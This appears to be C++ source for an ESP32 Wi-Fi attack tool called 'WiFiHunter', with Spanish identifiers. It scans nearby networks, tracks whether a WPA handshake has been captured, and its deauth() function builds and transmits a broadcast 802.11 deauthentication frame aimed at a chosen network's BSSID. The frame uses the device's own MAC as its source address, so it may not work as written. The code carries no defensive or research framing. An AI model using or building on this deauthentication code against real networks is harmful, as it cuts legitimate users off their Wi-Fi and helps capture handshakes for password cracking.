#include "WiFiHunter.h"

void WiFiHunter::begin() {
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);
}

void WiFiHunter::scan(RedInfo* resultados, int maxRedes, int& encontradas) {
    encontradas = 0;
    
    int n = WiFi.scanNetworks(false, false);
    
    for (int i = 0; i < n && i < maxRedes; i++) {
        strncpy(resultados[i].ssid, WiFi.SSID(i).c_str(), 32);
        resultados[i].ssid[32] = '\0';
        
        memcpy(resultados[i].bssid, WiFi.BSSID(i), 6);
        resultados[i].rssi = WiFi.RSSI(i);
        resultados[i].canal = WiFi.channel(i);
        resultados[i].tieneClave = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        resultados[i].handshakeCapturado = false;
        
        encontradas++;
    }
    
    WiFi.scanDelete();
}

void WiFiHunter::deauth(const RedInfo& red) {
    // Frame de deauth básico
    uint8_t deauthFrame[26];
    
    // Header
    deauthFrame[0] = 0xC0; // Deauth
    deauthFrame[1] = 0x00;
    deauthFrame[2] = 0x3A; // Duration
    deauthFrame[3] = 0x01;
    
    // Destination (broadcast)
    memset(&deauthFrame[4], 0xFF, 6);
    
    // Source (nuestra MAC)
    uint8_t nuestraMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, nuestraMac);
    memcpy(&deauthFrame[10], nuestraMac, 6);
    
    // BSSID (la red objetivo)
    memcpy(&deauthFrame[16], red.bssid, 6);
    
    // Sequence number (lo maneja el driver)
    
    // Reason code: 7
    deauthFrame[24] = 0x07;
    deauthFrame[25] = 0x00;
    
    // Enviar frame
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
}
